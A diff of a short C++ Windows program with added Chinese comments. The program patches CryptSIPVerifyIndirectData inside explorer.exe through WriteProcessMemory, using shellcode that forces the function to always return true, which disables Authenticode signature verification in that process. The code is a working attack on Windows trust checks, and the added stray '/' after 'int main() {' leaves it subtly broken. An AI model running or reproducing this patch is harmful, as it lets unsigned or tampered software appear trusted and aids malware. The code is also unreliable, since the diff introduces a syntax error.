@@ -23,14 +23,16 @@ char tmpModName[MAX_PATH], *pfnCryptVerifyData;
  *     +0x05 - C3       - ret
  */
 char x96payload[] = { "\x48\x31\xC0\xFE\xC0\xC3" };
-int main() {
+int main() {/
 	pfnCryptVerifyData = (PCHAR)GetProcAddress(LoadLibraryA("Crypt32"), "CryptSIPVerifyIndirectData");
+	// 列舉出所有可顯示的視窗，再以 GetWindowThreadProcessId 確認其視窗擁有者的晚整路警是否為"C:\\Windows\\explorer.exe"
 	EnumWindows([](HWND hWnd, LPARAM lParam) -> BOOL {
 		DWORD processId;
 		GetWindowThreadProcessId(hWnd, &processId);
 		if (HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)) {
 			GetModuleFileNameExA(hProc, NULL, tmpModName, sizeof(tmpModName));
 			if (!stricmp(tmpModName, "C:\\Windows\\explorer.exe"))
+				// 以 WriteProcessMemory 對其記憶體中的 CryptSIPVerifyIndirectData 的機械碼進行寫入，使其函數被呼叫時必定回傳 True 的結果
 				patchedDone |= WriteProcessMemory(hProc, pfnCryptVerifyData, x96payload, sizeof(x96payload), NULL);
 		}
 		return true;
